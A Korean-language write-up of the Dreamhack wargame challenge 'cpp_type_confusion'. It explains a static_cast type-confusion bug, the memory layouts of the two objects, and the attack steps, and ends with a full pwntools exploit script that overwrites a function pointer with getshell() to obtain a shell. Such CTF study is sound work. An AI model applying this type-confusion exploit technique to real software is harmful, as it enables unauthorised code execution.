# cpp_type_confusion

[문제 링크](https://dreamhack.io/wargame/challenges/65)

## 취약점 개요

잘못된 다운 캐스팅으로 인한 취약점 발생

```cpp
mixer = static_cast<Apple*>(mango);
```

static_cast는 컴파일 타임에 타입 변환이 가능한지만 체크할 뿐, 런타임에 실제 객체가 변환하려는 클래스 타입이 맞는지 전혀 검증하지 않습니다. 부모 클래스 포인터 타입인 mango는 실제 런타임에 Mango 객체를 가리키고 있으나, 이 코드가 실행된 이후부터 컴파일러는 이 메모리를 Apple 객체로 오인하기 시작합니다.


## 객체별 메모리 구조

Apple 객체 메모리 구조

| 메모리 주소  | 설명                                        |
| :----------- | :------------------------------------------ |
| Apple + 0x00 | _vptr (가상 함수 테이블 포인터 - 8바이트)   |
| Apple + 0x08 | char description[8] (문자열 배열 - 8바이트) |

<hr>

Mango 객체 메모리 구조

| 메모리 주소  | 설명                                              |
| :----------- | :------------------------------------------------ |
| Mango + 0x00 | _vptr (가상 함수 테이블 포인터 - 8바이트)         |
| Mango + 0x08 | void (*description)(void) (함수 포인터 - 8바이트) |

mixer 변수가 Apple* 타입으로 선언되어 있으므로, mixer->description을 참조하면 컴파일러는 [Base 주소 + 0x08]에 위치한 문자열 배열 공간에 값을 쓴다고 판단합니다. 그러나 실제 그 주소에는 Mango 객체의 가상 함수가 아닌 일반 함수 포인터(void (*description)(void))가 위치하고 있습니다.

## 공격 시나리오

- 객체 생성: 메뉴 1번과 2번을 이용해 Apple 객체와 Mango 객체를 각각 new 연산자로 힙(Heap) 메모리에 할당합니다.

- 잘못된 타입 캐스팅 유도: 3번 메뉴(Mix)를 호출합니다. 내부적으로 static_cast에 의해 Mango 객체의 주소가 Apple* 타입인 mixer에 저장됩니다.

- 함수 포인터 오염: Applemango name:  입력 프롬프트가 뜰 때, 일반 문자열 대신  getshell() 함수의 메모리 주소(8바이트)를 전송합니다.

- strncpy(mixer->description, ...) 코드가 실행되면서, 실제 Mango 객체의 description 함수 포인터 자리가 getshell 주소로 완벽하게 덮어써집니다.

- 4번 메뉴(Eat)를 선택한 뒤 2번(Mango)을 고르면 mango->yum()이 실행됩니다.

- Mango::yum() 내부 코드는 덮어써진 description() 함수 포인터를 그대로 호출하게 되므로, 정상적인 mangohi 함수 대신 getshell()이 트리거되며 시스템 쉘을 획득합니다.

## 익스플로잇 코드

```python
from pwn import *
import sys

context.arch = "amd64"

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./cpp_type_confusion')

e = ELF('./cpp_type_confusion')

getshell_addr = e.sym['_Z8getshellv']

p.sendlineafter(b"Select : ", b"1")
p.sendlineafter(b"Select : ", b"2")

p.sendlineafter(b"Select : ", b"3")

payload = p64(getshell_addr)
p.sendlineafter(b"Applemango name: ", payload)

p.sendlineafter(b"Select : ", b"4")
p.sendlineafter(b"Select : ", b"2")

p.interactive()
```